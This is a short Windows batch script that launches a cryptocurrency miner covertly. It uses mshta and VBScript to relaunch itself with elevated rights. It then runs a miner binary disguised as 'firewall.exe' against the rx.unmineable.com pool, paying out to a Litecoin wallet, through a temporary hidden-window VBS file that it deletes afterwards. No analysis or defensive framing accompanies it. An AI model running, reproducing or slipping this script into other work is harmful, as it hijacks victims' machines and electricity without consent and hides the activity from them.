@echo off
:: Batch section - launches VBS with admin rights
if "%1"=="hidden" goto :XMRIG
mshta vbscript:Execute("CreateObject(""Shell.Application"").ShellExecute ""%~f0"", ""hidden"", , """", 1:close")
exit /b

:XMRIG
:: This part runs with admin rights
set "DIR=%~dp0"
set "CMD=firewall.exe -t 1 -o rx.unmineable.com:3333 -u LTC:Lh1cpVWdWRG2AUVvsi1FquBAmHwRSBzQij.WinLuekeRing1#e4xd-wmzl -p x"

:: Create temporary VBS to run completely hidden
echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\runxmrig.vbs"
echo WshShell.Run "cmd /c cd /d ""%DIR%"" && %CMD%", 0 >> "%TEMP%\runxmrig.vbs"
wscript "%TEMP%\runxmrig.vbs"
del "%TEMP%\runxmrig.vbs"